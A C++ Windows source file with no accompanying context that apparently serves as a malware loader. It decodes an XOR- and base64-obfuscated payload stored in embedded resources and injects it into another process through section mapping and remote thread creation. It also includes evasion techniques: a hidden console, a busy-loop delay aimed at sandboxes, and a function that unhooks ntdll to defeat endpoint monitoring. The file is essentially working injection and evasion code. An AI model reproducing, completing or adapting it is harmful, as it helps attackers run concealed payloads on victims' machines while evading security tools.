#include <iostream>
#include <Windows.h>
#include <psapi.h>
#include <string>
#include "ntdll.h"
#include "base64.h"
#include "resource.h"

void unhook();
void sleep();
void checkNtStatus(NTSTATUS status);
const std::string loadPayload();

int main(int argc, char** argv)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	sleep();

	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
	if (ntdll == NULL)
	{
		exit(1);
	}
	NTSTATUS status;
	NtCreateSection = (NT_CREATE_SECTION)GetProcAddress(ntdll, "NtCreateSection");
	NtMapViewOfSection = (NT_MAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtMapViewOfSection");
	NtUnmapViewOfSection = (NT_UNMAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtUnmapViewOfSection");
	NtWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	NtOpenProcess = (NT_OPEN_PROCESS)GetProcAddress(ntdll, "NtOpenProcess");
	RtlCreateUserThread = (RTL_CREATE_USER_THREAD)GetProcAddress(ntdll, "RtlCreateUserThread");
	NtWaitForSingleObject = (NT_WAIT_FOR_SINGLE_OBJECT)GetProcAddress(ntdll, "NtWaitForSingleObject");
	NtClose = (NT_CLOSE)GetProcAddress(ntdll, "NtClose");

	const std::string payload = loadPayload();
	SIZE_T size = payload.size();
	LARGE_INTEGER sectionSize = { size };
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE section = NULL;
	HANDLE targetProcess = NULL;
	HANDLE targetProcessThread = NULL;
	PVOID localSection = NULL, targetSection = NULL;

	status = NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	checkNtStatus(status);

	status = NtMapViewOfSection(section, currentProcess, &localSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_READWRITE);
	checkNtStatus(status);

	targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 17464);

	status = NtMapViewOfSection(section, targetProcess, &targetSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	checkNtStatus(status);

	status = NtWriteVirtualMemory(currentProcess, localSection, (PVOID)payload.c_str(), size, NULL);
	checkNtStatus(status);

	status = RtlCreateUserThread(targetProcess, NULL, FALSE, 0, 0, 0, targetSection, NULL, &targetProcessThread, NULL);
	checkNtStatus(status);

	status = NtWaitForSingleObject(targetProcessThread, FALSE, NULL);
	checkNtStatus(status);

	status = NtClose(targetProcessThread);
	checkNtStatus(status);
	status = NtUnmapViewOfSection(targetProcess, targetSection);
	checkNtStatus(status);
	status = NtClose(targetProcess);
	checkNtStatus(status);

	status = NtUnmapViewOfSection(currentProcess, localSection);
	checkNtStatus(status);
	status = NtClose(section);
	checkNtStatus(status);

	FreeLibrary(ntdll);

	return 0;
}

void unhook()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
}

void sleep()
{
	for (int i = 0; i <= 333333; i++)
	{
		for (int j = 2; j <= i / 2; j++)
		{
			if (i % j == 0)
			{
				break;
			}
		}
	}
}

void checkNtStatus(NTSTATUS status)
{
	if (!NT_SUCCESS(status))
	{
		exit(1);
	}
}

const std::string loadPayload()
{
	HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDR_KEY1), L"key");
	DWORD keySize = SizeofResource(NULL, keyResource);
	HGLOBAL keyResourceHandle = LoadResource(NULL, keyResource);
	char* key = (char*)LockResource(keyResourceHandle);

	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
	HGLOBAL obfuscatedPayloadResourceHandle = LoadResource(NULL, obfuscatedPayloadResource);
	char* encodedObfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
	const std::string obfuscatedPayload = base64_decode(encodedObfuscatedPayload);
	size_t obfuscatedPayloadSize = obfuscatedPayload.size();
	std::string payload = "";

	int keyIndex = 0;
	for (unsigned int i = 0; i < obfuscatedPayloadSize; i += 4)
	{
		std::string currentByte = std::string() + obfuscatedPayload[i] + obfuscatedPayload[i + 1] + obfuscatedPayload[i + 2] + obfuscatedPayload[i + 3];
		payload += stol(currentByte, nullptr, 0) ^ key[keyIndex++ % keySize];
	}

	FreeResource(keyResourceHandle);
	FreeResource(obfuscatedPayloadResource);

	return payload;
}
